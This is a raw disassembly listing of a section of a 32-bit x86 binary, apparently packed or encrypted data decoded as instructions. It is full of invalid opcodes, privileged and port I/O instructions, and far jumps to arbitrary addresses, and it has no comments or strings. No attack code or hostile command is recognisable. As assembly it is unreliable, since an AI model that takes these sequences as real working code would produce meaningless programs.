  42ed1e:	sbb    dl,BYTE PTR [esi]
  42ed20:	dec    eax
  42ed21:	int3   
  42ed22:	sub    eax,0x79a14620
  42ed27:	push   ebx
  42ed28:	test   al,0x58
  42ed2a:	dec    ecx
  42ed2b:	rol    esp,1
  42ed2d:	in     al,0x57
  42ed2f:	jmp    0x88401df4
  42ed34:	jecxz  0x42edb3
  42ed36:	jnp    0x42ecf1
  42ed38:	retf   0xc5dc
  42ed3b:	xor    BYTE PTR [ebx-0x6a941c9],0x0
	...
  42edb2:	add    BYTE PTR [eax],al
  42edb4:	out    0x82,al
  42edb6:	lods   eax,DWORD PTR ds:[esi]
  42edb7:	xor    ebp,ebp
  42edb9:	aas    
  42edba:	(bad)  
  42edbb:	xlat   BYTE PTR ds:[ebx]
  42edbc:	jmp    0x42ed84
  42edbe:	popa   
  42edbf:	test   eax,0xd3d915bf
  42edc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42edc5:	out    dx,al
  42edc6:	add    DWORD PTR [eax],eax
  42edc8:	cmc    
  42edc9:	add    BYTE PTR [eax],al
  42edcb:	add    BYTE PTR [edx*2+0x75bc1431],ch
  42edd2:	cli    
  42edd3:	pusha  
  42edd4:	cwde   
  42edd5:	std    
  42edd6:	punpcklwd mm3,mm3
  42edd9:	ds imul edx,esi,0x1a
  42eddd:	dec    esi
  42edde:	ret    
  42eddf:	push   edi
  42ede0:	jmp    0x4ecb:0x503b86d2
  42ede7:	jecxz  0x42ede7
  42ede9:	adc    edi,DWORD PTR [ecx]
  42edeb:	mov    dh,0x8f
  42eded:	mov    eax,0xc9a4042c
  42edf2:	call   0xedb4a9bb
  42edf7:	mov    ss,WORD PTR [ebp-0x7f]
  42edfa:	push   edx
  42edfb:	dec    eax
  42edfc:	mov    ch,0xda
  42edfe:	fstp   TBYTE PTR [edi]
  42ee00:	dec    ecx
  42ee01:	lods   eax,DWORD PTR ds:[esi]
  42ee02:	cmp    BYTE PTR [ecx-0x69463b3c],al
  42ee08:	mov    ds:0x1f2da1df,al
  42ee0d:	adc    ch,BYTE PTR [edi]
  42ee0f:	iret   
  42ee10:	push   ds
  42ee11:	retf   
  42ee12:	loop   0x42ee3e
  42ee14:	or     BYTE PTR ds:0x2bf62502,al
  42ee1a:	xchg   esp,eax
  42ee1b:	jmp    0xd3a0070
  42ee20:	in     al,0xbe
  42ee22:	cmp    al,ah
  42ee24:	inc    edi
  42ee25:	or     eax,0x8b10a4b5
  42ee2a:	hlt    
  42ee2b:	leave  
  42ee2c:	xor    DWORD PTR [edx-0x5c5bd8a3],esi
  42ee32:	(bad)  
  42ee33:	mov    esi,0xf4c4461
  42ee38:	dec    edx
  42ee39:	adc    cl,BYTE PTR [ecx]
  42ee3b:	out    dx,eax
  42ee3c:	shl    DWORD PTR [edx-0x79],1
  42ee3f:	fnsave [esi+0x2]
  42ee42:	daa    
  42ee43:	in     al,dx
  42ee44:	xor    edx,esp
  42ee46:	leave  
  42ee47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee48:	add    esi,ecx
  42ee4a:	cmp    ebx,ebp
  42ee4c:	or     ah,0x21
  42ee4f:	fsub   QWORD PTR [ecx+eiz*2]
  42ee52:	int3   
  42ee53:	and    ah,dl
  42ee55:	mov    ds:0xd6506c76,eax
  42ee5a:	jecxz  0x42ee9a
  42ee5c:	push   edx
  42ee5d:	inc    ecx
  42ee5e:	xchg   ebx,eax
  42ee5f:	or     eax,ebx
  42ee61:	add    BYTE PTR [ebx+0x37fb9c0a],0xd1
  42ee68:	sbb    eax,0xef1d010
  42ee6d:	pushf  
  42ee6e:	pop    ds
  42ee6f:	ds mov edi,0x44c3937f
  42ee75:	pop    eax
  42ee76:	xor    ch,BYTE PTR [edx+0x30572017]
  42ee7c:	aad    0x40
  42ee7e:	js     0x42ee96
  42ee80:	mov    cl,0x13
  42ee82:	fbstp  TBYTE PTR [edi+0x6eef6783]
  42ee88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee89:	pop    edi
  42ee8a:	loope  0x42ee39
  42ee8c:	dec    edi
  42ee8d:	bound  edi,QWORD PTR [eax+0x1bccd984]
  42ee93:	fimul  DWORD PTR [edx]
  42ee95:	lods   al,BYTE PTR ds:[esi]
  42ee96:	scas   eax,DWORD PTR es:[edi]
  42ee97:	inc    ebx
  42ee98:	mov    eax,0xb6aa73bb
  42ee9d:	aam    0x1d
  42ee9f:	sub    DWORD PTR [edx*1+0x765e5984],ecx
  42eea6:	dec    ebp
  42eea7:	mov    dl,BYTE PTR [eax+eax*4-0x48]
  42eeab:	cmp    DWORD PTR [ecx+0x56d919a4],esp
  42eeb1:	push   ebx
  42eeb2:	mov    ecx,0x67459782
  42eeb7:	xchg   ebp,eax
  42eeb8:	jmp    0xdf839799
  42eebd:	jno    0x42ef05
  42eebf:	es call 0x42eec5
	...
  42ef31:	add    BYTE PTR [eax],al
  42ef33:	add    BYTE PTR [edx],al
  42ef35:	(bad)  
  42ef36:	jb     0x42eede
  42ef38:	(bad)  
  42ef39:	scas   al,BYTE PTR es:[edi]
  42ef3a:	(bad)  
  42ef3b:	(bad)  
  42ef3c:	cmp    DWORD PTR [edi],edi
  42ef3e:	int3   
  42ef3f:	repnz mov ebp,0x9a74246c
  42ef45:	out    dx,eax
  42ef46:	add    DWORD PTR [eax],eax
  42ef48:	cmc    
  42ef49:	add    BYTE PTR [eax],al
  42ef4b:	add    ch,dl
  42ef4d:	sbb    al,0x98
  42ef4f:	add    bh,ah
  42ef51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef52:	cli    
  42ef53:	mov    dl,0x48
  42ef55:	push   0x69
  42ef57:	cwde   
  42ef58:	nop
  42ef59:	or     al,0xfc
  42ef5b:	inc    ebx
  42ef5c:	inc    ecx
  42ef5d:	cld    
  42ef5e:	cs xchg ecx,eax
  42ef60:	js     0x42efba
  42ef62:	std    
  42ef63:	xchg   edx,eax
  42ef64:	cmc    
  42ef65:	cwde   
  42ef66:	sub    DWORD PTR [edx],edi
  42ef68:	mov    bl,0x94
  42ef6a:	call   0x5dc518ef
  42ef6f:	psrlq  mm6,mm3
  42ef72:	aad    0xc2
  42ef74:	mov    al,ds:0x141a87d4
  42ef79:	gs push es
  42ef7b:	xor    al,BYTE PTR [edx+0x1706fc4c]
  42ef81:	(bad)  
  42ef82:	push   ecx
  42ef83:	lahf   
  42ef84:	sbb    eax,0xaf935708
  42ef89:	ja     0x42efec
  42ef8b:	or     al,0x5
  42ef8d:	shl    DWORD PTR ds:0xb0ac4f7c,1
  42ef93:	ret    
  42ef94:	ret    
  42ef95:	fsubr  DWORD PTR [ecx]
  42ef97:	push   ebx
  42ef98:	pop    es
  42ef99:	jecxz  0x42efdd
  42ef9b:	and    al,dh
  42ef9d:	mov    dh,0xb5
  42ef9f:	cmp    eax,0x8d428711
  42efa4:	stc    
  42efa5:	push   ebx
  42efa6:	mov    bh,0xd9
  42efa8:	xchg   esi,eax
  42efa9:	call   0x38c3:0xeed289ea
  42efb0:	into   
  42efb1:	data16 out 0x87,al
  42efb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42efb5:	ja     0x42ef8f
  42efb7:	fdiv   DWORD PTR [esi+0x5f]
  42efba:	(bad)  
  42efbb:	xor    eax,DWORD PTR ds:0xfb6ab87a
  42efc1:	shr    ah,cl
  42efc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efc4:	outs   dx,BYTE PTR ds:[esi]
  42efc5:	repnz std 
  42efc7:	call   0xb3c9:0xf41ca19c
  42efce:	fs mov esp,?
  42efd1:	dec    ebp
  42efd2:	xor    al,0xab
  42efd4:	(bad)
  42efd7:	sbb    eax,0xc61f30c
  42efdc:	(bad)  
  42efdd:	jmp    0x67ea:0x41a4e7b4
  42efe4:	jle    0x42efba
  42efe6:	push   eax
  42efe7:	pop    eax
  42efe8:	jmp    0x42efa3
  42efea:	call   0x9b103999
  42efef:	jo     0x42efd8
  42eff1:	mov    BYTE PTR [ebx+0x6a9d76cd],ch
  42eff7:	sbb    DWORD PTR [eax+0x79],ebx
  42effa:	jo     0x42f047
  42effc:	fild   DWORD PTR ds:0x9d92e60a
  42f002:	nop
  42f003:	out    0xef,eax
  42f005:	test   eax,0x8a923ccd
  42f00a:	mov    ebx,0x36fdb536
  42f00f:	pop    edx
  42f010:	jmp    0xa7af23ee
  42f015:	fisub  DWORD PTR [eax+ecx*1+0x48]
  42f019:	bnd jno 0x42f059
  42f01c:	push   edx
  42f01d:	jmp    FWORD PTR [ecx-0x57a8282]
  42f023:	jmp    0x42f08d
  42f025:	xor    BYTE PTR [ecx+0x17bb4e4f],ah
  42f02b:	cmp    DWORD PTR [eax+ecx*2+0x7b],ecx
  42f02f:	bound  edx,QWORD PTR [edi-0x74453375]
  42f035:	ins    BYTE PTR es:[edi],dx
  42f036:	dec    ebx
  42f037:	std    
  42f038:	adc    DWORD PTR [edx-0xf],esp
  42f03b:	cli    
  42f03c:	cld    
  42f03d:	add    eax,0x8ce73a
	...
  42f0b2:	add    BYTE PTR [eax],al
  42f0b4:	mov    eax,ds:0x7e061ecf
  42f0b9:	xlat   BYTE PTR ds:[ebx]
  42f0ba:	mov    ecx,0xd7e009ef
  42f0bf:	(bad)  
  42f0c0:	cli    
  42f0c1:	hlt    
  42f0c2:	pop    ebx
  42f0c3:	lea    ecx,[edi-0xafffe10]
  42f0c9:	add    BYTE PTR [eax],al
  42f0cb:	add    BYTE PTR [eax+0x543ee060],ah
  42f0d1:	push   ebx
  42f0d2:	and    BYTE PTR [edx],cl
  42f0d4:	lahf   
  42f0d5:	fimul  WORD PTR cs:[esi+ebp*4]
  42f0d9:	sub    al,0xb5
  42f0db:	sub    DWORD PTR [esi],edi
  42f0dd:	inc    esi
  42f0de:	add    eax,DWORD PTR [ebx-0x48f8bca0]
  42f0e4:	in     al,0x3b
  42f0e6:	mov    dl,0xc3
  42f0e8:	mov    al,ds:0x3dbf9ea1
  42f0ed:	and    BYTE PTR [esi],0x4c
  42f0f0:	imul   esp
  42f0f2:	dec    esi
  42f0f3:	sti    
  42f0f4:	jle    0x42f0f6
  42f0f6:	lods   eax,DWORD PTR ds:[esi]
  42f0f7:	sub    bh,BYTE PTR [esp+ecx*4-0x62d4ca51]
  42f0fe:	ins    DWORD PTR es:[edi],dx
  42f0ff:	cmp    DWORD PTR [edx+0x71],esi
  42f102:	xchg   DWORD PTR ds:0x4f15842d,ebx
  42f108:	cmp    eax,0x3ce59a1e
  42f10d:	jnp    0x42f135
  42f10f:	xlat   BYTE PTR ds:[ebx]
  42f110:	hlt    
  42f111:	inc    esi
  42f112:	cmp    BYTE PTR [edi+0x20],bh
  42f115:	pop    ebp
  42f116:	pop    eax
  42f117:	idiv   BYTE PTR [esi+eax*1]
  42f11a:	std    
  42f11b:	sub    BYTE PTR [esi+0x3dd04ede],dh
  42f121:	sub    ch,BYTE PTR [eax]
  42f123:	scas   al,BYTE PTR es:[edi]
  42f124:	sub    BYTE PTR [edi+0x44],dh
  42f127:	xchg   esi,eax
  42f128:	mov    al,ds:0xd61b25ed
  42f12d:	sbb    DWORD PTR [esi-0x5ae9223d],eax
  42f133:	sub    al,0x64
  42f135:	mov    WORD PTR [edx-0x39ae6c52],ss
  42f13b:	outs   dx,BYTE PTR ds:[esi]
  42f13c:	call   0x846b:0x160ed7a5
  42f143:	test   eax,0xcc9b49f
  42f148:	jge    0x42f0e8
  42f14a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f14b:	dec    ecx
  42f14c:	pop    ebp
  42f14d:	push   ds
  42f14e:	and    DWORD PTR [edx-0x3f8307ef],0xffffff9e
  42f155:	mov    eax,0x108d862b
  42f15a:	inc    ebx
  42f15b:	cwde   
  42f15c:	push   es
  42f15d:	les    esp,FWORD PTR [ecx]
  42f15f:	dec    edx
  42f160:	xor    bh,BYTE PTR [edx]
  42f162:	pop    esi
  42f163:	push   es
  42f164:	mov    esi,0xa4681d10
  42f169:	test   eax,0xb1e79ce4
  42f16e:	and    edi,esp
  42f170:	add    BYTE PTR [ebx],dl
  42f172:	bound  ebx,QWORD PTR [esi-0x41]
  42f175:	jmp    0x33aa7c6d
  42f17a:	dec    esi
  42f17b:	push   ecx
  42f17c:	jmp    0x42f10b
  42f17e:	loop   0x42f16f
  42f180:	mov    cl,0x6b
  42f182:	daa    
  42f183:	sbb    eax,0xb5f26e96
  42f188:	or     bh,BYTE PTR [eax]
  42f18a:	mov    eax,ds:0x67fc3090
  42f18f:	add    al,0xb9
  42f191:	pop    ecx
  42f192:	int    0x19
  42f194:	jle    0x42f173
  42f196:	icebp  
  42f197:	mov    fs,WORD PTR [edx]
  42f199:	fdivr  DWORD PTR [ebx+0x46801566]
  42f19f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f1a0:	and    ah,BYTE PTR [ecx+edx*1-0x5f5adfd8]
  42f1a7:	loopne 0x42f190
  42f1a9:	inc    ecx
  42f1aa:	ficom  WORD PTR [eax+0x41]
  42f1ad:	pushf  
  42f1ae:	cwde   
  42f1af:	jno    0x42f1e8
  42f1b1:	fcomp  QWORD PTR [edi]
  42f1b3:	iret   
  42f1b4:	sub    al,0x81
  42f1b6:	stc    
  42f1b7:	push   0x194edacd
  42f1bc:	daa    
  42f1bd:	push   esi
  42f1be:	ins    BYTE PTR es:[edi],dx
  42f1bf:	mov    ecx,0x3c
	...
  42f234:	lods   eax,DWORD PTR ds:[esi]
  42f235:	cmp    eax,0xb79aa78a
  42f23a:	lods   eax,DWORD PTR ds:[esi]
  42f23b:	aas    
  42f23c:	jp     0x42f245
  42f23e:	int3   
  42f23f:	icebp  
  42f240:	add    BYTE PTR [ebx-0xe7b475d],dl
  42f246:	add    DWORD PTR [eax],eax
  42f248:	cmc    
  42f249:	add    BYTE PTR [eax],al
  42f24b:	add    BYTE PTR [ecx-0x5],cl
  42f24e:	mov    esp,0xcc660f53
  42f253:	sub    dl,0xb9
  42f256:	fadd   QWORD PTR [edi-0x1b]
  42f259:	xor    ebp,0x6d
  42f25c:	stc    
  42f25d:	retf   
  42f25e:	jge    0x42f1f3
  42f260:	dec    ebx
  42f261:	dec    ebp
  42f262:	retf   
  42f263:	jbe    0x42f241
  42f265:	or     al,0x11
  42f267:	pusha  
  42f268:	sub    ebx,edx
  42f26a:	mov    ebx,cs
  42f26c:	adc    esi,DWORD PTR [eax+0x1c926f48]
  42f272:	add    DWORD PTR [ecx+esi*1+0x75],esp
  42f276:	jb     0x42f219
  42f278:	push   es
  42f279:	jnp    0x42f2de
  42f27b:	jmp    0x432c:0x74a193ae
  42f282:	pusha  
  42f283:	adc    dl,BYTE PTR [eax+edi*4]
  42f286:	and    edx,ebx
  42f288:	mov    DWORD PTR [ebx],ebp
  42f28a:	mov    esp,0xb4d8ba6d
  42f290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f291:	dec    ebx
  42f292:	int    0x55
  42f294:	pop    ds
  42f295:	dec    esp
  42f296:	loopne 0x42f313
  42f298:	xlat   BYTE PTR ds:[ebx]
  42f299:	scas   al,BYTE PTR es:[edi]
  42f29a:	lahf   
  42f29b:	adc    BYTE PTR [edi],ch
  42f29d:	iretw  
  42f29f:	ins    DWORD PTR es:[edi],dx
  42f2a0:	sbb    eax,0x24429cb5
  42f2a5:	cdq    
  42f2a6:	add    eax,0xf38015cd
  42f2ab:	jb     0x42f268
  42f2ad:	loopne 0x42f250
  42f2af:	cdq    
  42f2b0:	ss mov edx,0x800abb7e
  42f2b6:	into   
  42f2b7:	mov    DWORD PTR [edi-0x3b],ebp
  42f2ba:	or     al,0x45
  42f2bc:	les    eax,FWORD PTR [ebx]
  42f2be:	adc    eax,0x21cc5196
  42f2c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f2c4:	mov    ss,WORD PTR [edx+0xbaae337]
  42f2ca:	xor    DWORD PTR cs:[esi-0x1716484],ecx
  42f2d1:	push   es
  42f2d2:	mov    esi,0xa4f1fa8b
  42f2d7:	pop    edx
  42f2d8:	add    esi,esp
  42f2da:	mov    esp,0x68c0d226
  42f2df:	mov    dh,0x3a
  42f2e1:	jmp    0xce5f:0x9991e122
  42f2e8:	shr    DWORD PTR [ebx],0x88
  42f2eb:	jnp    0x42f2cb
  42f2ed:	pushf  
  42f2ee:	pop    ss
  42f2ef:	hlt    
  42f2f0:	bound  esp,QWORD PTR [edx]
  42f2f2:	int3   
  42f2f3:	(bad)  
  42f2f4:	mov    dl,0x32
  42f2f6:	xchg   BYTE PTR [esi+0x53379840],cl
  42f2fc:	mov    ah,0x9c
  42f2fe:	push   ecx
  42f2ff:	mov    ds:0x94ad2cb6,eax
  42f304:	imul   esi,DWORD PTR [edi-0x3b619a24],0xe46ad900
  42f30e:	call   0xcd43713
  42f313:	shl    edx,1
  42f315:	push   ss
  42f316:	sub    al,0xe
  42f318:	outs   dx,BYTE PTR ds:[esi]
  42f319:	leave  
  42f31a:	pop    ds
  42f31b:	and    eax,0x4ef6f223
  42f320:	and    eax,0xf965630
  42f325:	xlat   BYTE PTR ds:[ebx]
  42f326:	imul   eax,DWORD PTR [ebx+0x7a4e5466],0x59
  42f32d:	loopne 0x42f2e8
  42f32f:	repnz push eax
  42f331:	mov    esp,0x687ac0a4
  42f336:	iret   
  42f337:	hlt    
  42f338:	(bad)  
  42f339:	jl     0x42f373
  42f33b:	mov    ds:0xfd94bce2,al
  42f340:	jmp    0x0:0x0
	...
  42f3b3:	add    dl,ah
  42f3b5:	mov    ebp,0xe7dfc7dc
  42f3ba:	sti    
  42f3bb:	mov    ebp,0xca33a8a7
  42f3c0:	sbb    eax,0x79929921
  42f3c5:	repnz add DWORD PTR [eax],eax
  42f3c8:	cmc    
  42f3c9:	add    BYTE PTR [eax],al
  42f3cb:	add    BYTE PTR [edx-0x1d9ffd21],bl
  42f3d1:	pop    ebp
  42f3d2:	jne    0x42f3d4
  42f3d4:	jg     0x42f397
  42f3d6:	push   ecx
  42f3d7:	aam    0x79
  42f3d9:	cld    
  42f3da:	cmc    
  42f3db:	out    dx,al
  42f3dc:	inc    ebx
  42f3dd:	xor    DWORD PTR [ebp-0x4683396e],ebp
  42f3e3:	mov    esi,0x65cbb1a9
  42f3e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f3e9:	xor    DWORD PTR [eax*8+0x2f3c6365],edx
  42f3f0:	add    ebx,DWORD PTR [eax+eax*8-0x3c]
  42f3f4:	stos   DWORD PTR es:[edi],eax
  42f3f5:	cli    
  42f3f6:	into   
  42f3f7:	loope  0x42f3c0
  42f3f9:	adc    cl,BYTE PTR [ebx]
  42f3fb:	scas   eax,DWORD PTR es:[edi]
  42f3fc:	sbb    edi,DWORD PTR [edi]
  42f3fe:	aam    0xea
  42f400:	cmp    al,0x7f
  42f402:	pop    ecx
  42f403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f404:	or     BYTE PTR [edi-0x78a3cafd],0x70
  42f40b:	jmp    0x945:0xdb335d2d
  42f412:	enter  0xd734,0x6c
  42f416:	lods   al,BYTE PTR ds:[esi]
  42f417:	cs ins DWORD PTR es:[edi],dx
  42f419:	mov    edx,0x29f4b9bd
  42f41e:	int    0x15
  42f420:	sub    edi,ebp
  42f422:	pop    edi
  42f423:	jbe    0x42f4a3
  42f425:	mov    dl,0xe2
  42f427:	mov    bl,0x7b
  42f429:	lods   eax,DWORD PTR ds:[esi]
  42f42a:	xor    DWORD PTR [esi+0x61da8b26],esp
  42f430:	test   eax,0xbfcb7750
  42f435:	data16 jge 0x42f3c8
  42f438:	imul   ecx,DWORD PTR [edx],0xd8788fa4
  42f43e:	pop    es
  42f43f:	push   ss
  42f440:	jecxz  0x42f457
  42f442:	rol    bh,0x19
  42f445:	imul   edi,DWORD PTR [edx+0x164e08d1],0xeb332e4
  42f44f:	loop   0x42f479
  42f451:	imul   ebx,DWORD PTR [eax+eax*2],0x3cfcf88b
  42f458:	xor    bl,BYTE PTR [ebp+0x2f]
  42f45b:	jmp    0x2df2:0x56e186a5
  42f462:	ret    0x2cf1
  42f465:	cdq    
  42f466:	cmp    BYTE PTR [esi+0xb3d27c8],bh
  42f46c:	fld    QWORD PTR [ecx]
  42f46e:	cmp    al,0x23
  42f470:	cmp    BYTE PTR [ebx+ecx*4],dl
  42f473:	cmc    
  42f474:	inc    ebp
  42f475:	mov    ds:0x53a541d6,al
  42f47a:	aas    
  42f47b:	es lock sbb eax,0xe6ebfe22
  42f482:	sub    DWORD PTR [ebx-0xb],esi
  42f485:	jmp    0x42f4f2
  42f487:	mov    ecx,0x8034c2d3
  42f48c:	clc    
  42f48d:	mov    ah,0xcc
  42f48f:	sub    dh,BYTE PTR [eax]
  42f491:	(bad)  
  42f492:	mov    ecx,0xb7d59c9b
  42f497:	pusha  
  42f498:	out    0xb,eax
  42f49a:	push   ds
  42f49b:	jno    0x42f47e
  42f49d:	mov    edx,DWORD PTR [ebx]
  42f49f:	jle    0x42f470
  42f4a1:	ret    0xc8a0
  42f4a4:	lea    esp,[ecx-0x50e92944]
  42f4aa:	pop    ds
  42f4ab:	push   ds
  42f4ac:	int3   
  42f4ad:	int3   
  42f4ae:	adc    bl,0x4
  42f4b1:	xchg   esp,eax
  42f4b2:	sbb    ebx,0x475b89ab
  42f4b8:	xchg   esi,eax
  42f4b9:	mov    esi,0x5627cf62
  42f4be:	out    0x5c,al
  42f4c0:	dec    esp
	...
  42f531:	add    BYTE PTR [eax],al
  42f533:	add    BYTE PTR [ebp+0x38],dl
  42f536:	into   
  42f537:	adc    bh,ch
  42f539:	neg    bh
  42f53b:	jge    0x42f546
  42f53d:	push   cs
  42f53e:	xchg   BYTE PTR [edi+0x18],bh
  42f541:	jnp    0x42f586
  42f543:	pop    ebp
  42f544:	outs   dx,BYTE PTR ds:[esi]
  42f545:	repz add DWORD PTR [eax],eax
  42f548:	cmc    
  42f549:	add    BYTE PTR [eax],al
  42f54b:	add    al,dl
  42f54d:	cmp    DWORD PTR [esi-0x4e126bf6],0x77
  42f554:	jge    0x42f596
  42f556:	inc    edi
  42f557:	jmp    0x5017bbc5
  42f55c:	push   ss
  42f55d:	adc    BYTE PTR [edx+0x2],ah
  42f560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f561:	hlt    
  42f562:	pop    edx
  42f563:	mov    WORD PTR [edi+0x4d],?
  42f566:	jp     0x42f58a
  42f568:	outs   dx,DWORD PTR ds:[esi]
  42f569:	dec    BYTE PTR [ecx-0x289cf886]
  42f56f:	icebp  
  42f570:	jg     0x42f59a
  42f572:	js     0x42f595
  42f574:	rcr    DWORD PTR [eax-0xf],cl
  42f577:	and    dl,BYTE PTR [ebx+0x1435df66]
  42f57d:	sbb    al,0x72
  42f57f:	add    BYTE PTR [ecx-0x6099c5e6],0x77
  42f586:	pop    es
  42f587:	xor    ch,ah
  42f589:	js     0x42f50d
  42f58b:	sbb    eax,0xf229c863
  42f590:	sbb    BYTE PTR [ebp-0x49],bl
  42f593:	adc    bl,BYTE PTR [esi+0x34d94e53]
  42f599:	xchg   DWORD PTR [esi],eax
  42f59b:	add    bh,BYTE PTR [ecx+eiz*2-0x6c]
  42f59f:	dec    esp
  42f5a0:	cld    
  42f5a1:	lods   al,BYTE PTR ds:[esi]
  42f5a2:	mov    edi,0xccde53bd
  42f5a7:	sub    bh,BYTE PTR [esi-0x2501d00b]
  42f5ad:	sbb    al,0x60
  42f5af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f5b0:	and    bh,ah
  42f5b2:	cdq    
  42f5b3:	and    esp,ecx
  42f5b5:	repnz pop ecx
  42f5b7:	sub    DWORD PTR [eax+0x45c76b10],ebx
  42f5bd:	dec    ebp
  42f5be:	js     0x42f5a9
  42f5c0:	mov    dh,0x2c
  42f5c2:	push   ebx
  42f5c3:	mov    cl,0x8a
  42f5c5:	jmp    FWORD PTR [ebx+ebx*4-0x168abb7f]
  42f5cc:	pop    esp
  42f5cd:	mov    dl,0xb5
  42f5cf:	dec    edx
  42f5d0:	cmp    al,0xc2
  42f5d2:	imul   ebx,DWORD PTR [ebp-0x27c65225],0xffffffa9
  42f5d9:	mov    cl,0x4b
  42f5db:	aad    0x80
  42f5dd:	and    al,0xef
  42f5df:	and    eax,0xd5d296d7
  42f5e4:	dec    ecx
  42f5e5:	xchg   edi,eax
  42f5e6:	xlat   BYTE PTR ds:[ebx]
  42f5e7:	loope  0x42f610
  42f5e9:	mov    ds:0xe8b035e0,eax
  42f5ee:	loope  0x42f62c
  42f5f0:	(bad)  
  42f5f1:	cli    
  42f5f2:	retf   0x10ef
  42f5f5:	or     BYTE PTR [esi],0xc2
  42f5f8:	lods   al,BYTE PTR ds:[esi]
  42f5f9:	stos   DWORD PTR es:[edi],eax
  42f5fa:	pop    ds
  42f5fb:	push   0x89845f04
  42f600:	xor    edx,DWORD PTR [edx+0x2e]
  42f603:	ret    0xe763
  42f606:	in     al,0x2a
  42f608:	add    edi,DWORD PTR [eax]
  42f60a:	enter  0x4d83,0x81
  42f60e:	and    al,0x7d
  42f610:	mov    ds:0xc6eb3c95,al
  42f615:	outs   dx,DWORD PTR ds:[esi]
  42f616:	push   ebp
  42f617:	jno    0x42f5f6
  42f619:	xchg   eax,ebx
  42f61b:	ret    
  42f61c:	iret   
  42f61d:	mov    ebp,esp
  42f61f:	cmp    eax,esi
  42f621:	cmp    dl,BYTE PTR [eax+0x6842c4e3]
  42f627:	jbe    0x42f626
  42f629:	js     0x42f669
  42f62b:	clc    
  42f62c:	out    dx,eax
  42f62d:	aam    0xb9
  42f62f:	jmp    0x1ff0:0xd8b3975c
  42f636:	in     al,0x16
  42f638:	in     al,0xb3
  42f63a:	sbb    DWORD PTR [esi+0x5c],esi
  42f63d:	mov    ds:0x863efc,eax
	...
  42f6b2:	add    BYTE PTR [eax],al
  42f6b4:	pop    edx
  42f6b5:	cmp    DWORD PTR [esi+0x2d],ecx
  42f6b8:	outs   dx,DWORD PTR ds:[esi]
  42f6b9:	jg     0x42f736
  42f6bb:	jg     0x42f6c6
  42f6bd:	mov    bh,0xe3
  42f6bf:	xor    bh,BYTE PTR [edx+0x63dc4339]
  42f6c5:	hlt    
  42f6c6:	add    DWORD PTR [eax],eax
  42f6c8:	cmc    
  42f6c9:	add    BYTE PTR [eax],al
  42f6cb:	add    BYTE PTR [eax-0x589621ec],ah
  42f6d1:	les    esp,FWORD PTR [eax+0x343c0a85]
  42f6d7:	lea    esp,[eax]
  42f6d9:	xchg   ecx,eax
  42f6da:	sahf   
  42f6db:	nop
  42f6dc:	sbb    edi,esi
  42f6de:	std    
  42f6df:	jbe    0x42f684
  42f6e1:	mov    al,ds:0x68e5faa6
  42f6e6:	jg     0x42f683
  42f6e8:	js     0x42f6a9
  42f6ea:	cmp    edx,DWORD PTR [ecx-0x46690308]
  42f6f0:	mov    cs,WORD PTR [edi-0x1df76a4c]
  42f6f6:	stos   DWORD PTR es:[edi],eax
  42f6f7:	scas   al,BYTE PTR es:[edi]
  42f6f8:	cli    
  42f6f9:	jl     0x42f73f
  42f6fb:	ds ja  0x42f693
  42f6fe:	xchg   DWORD PTR [eax-0x11],ecx
  42f701:	dec    edx
  42f702:	mov    eax,ds:0xb27ba393
  42f707:	pushf  
  42f708:	addr16 dec esi
  42f70a:	mov    DWORD PTR [edx],ebx
  42f70c:	or     BYTE PTR [edx],bh
  42f70e:	test   al,0xc9
  42f710:	or     al,0xee
  42f712:	cwde   
  42f713:	inc    eax
  42f714:	jp     0x42f6f8
  42f716:	cmp    bl,BYTE PTR [esp+eax*1-0x28ec26fd]
  42f71d:	loopne 0x42f6ab
  42f71f:	cmc    
  42f720:	fs sub cl,ch
  42f723:	sub    eax,DWORD PTR [ecx+0x3fdf19b4]
  42f729:	inc    eax
  42f72a:	in     al,dx
  42f72b:	dec    ecx
  42f72c:	or     BYTE PTR [eax+esi*8-0x2c],bl
  42f730:	pushf  
  42f731:	sub    dl,BYTE PTR [edx-0x704cfec0]
  42f737:	sub    al,0xfd
  42f739:	mov    ds:0xe3bb7efc,al
  42f73e:	call   0xc387bbca
  42f743:	and    dl,ah
  42f745:	add    bh,cl
  42f747:	call   0x7d3d:0x9c866b47
  42f74e:	jg     0x42f7b7
  42f750:	jecxz  0x42f6dd
  42f752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f753:	out    0xb9,eax
  42f755:	mov    ss,WORD PTR [bp+si-0x3e]
  42f759:	mov    esi,0xfb04de06
  42f75e:	lds    edx,FWORD PTR [eax+0x318f87e1]
  42f764:	xor    al,0xde
  42f766:	enter  0x270f,0x9b
  42f76a:	mov    esi,0xd1f29e3b
  42f76f:	sbb    ebp,DWORD PTR [edi]
  42f771:	inc    ecx
  42f772:	jo     0x42f789
  42f774:	aam    0xc1
  42f776:	inc    edi
  42f777:	cmc    
  42f778:	cmp    al,0x2d
  42f77a:	imul   esi,eax,0x4ad56e19
  42f780:	les    eax,FWORD PTR [esi-0x72]
  42f783:	sbb    eax,0x8d094964
  42f788:	jnp    0x42f710
  42f78a:	sub    edi,DWORD PTR [edi]
  42f78c:	push   0xffffffec
  42f78e:	gs dec ebx
  42f790:	outs   dx,DWORD PTR ds:[esi]
  42f791:	ret    
  42f792:	sub    ch,BYTE PTR [ebp-0x3aa347f2]
  42f798:	rol    BYTE PTR [edi+ecx*8-0x12131073],0x8a
  42f7a0:	fisub  WORD PTR [ebp+0x1]
  42f7a3:	sub    BYTE PTR [edi+0x698fc580],dl
  42f7a9:	out    dx,al
  42f7aa:	add    eax,0xc4eb9b1
  42f7af:	cmp    DWORD PTR [ecx-0x53],ebp
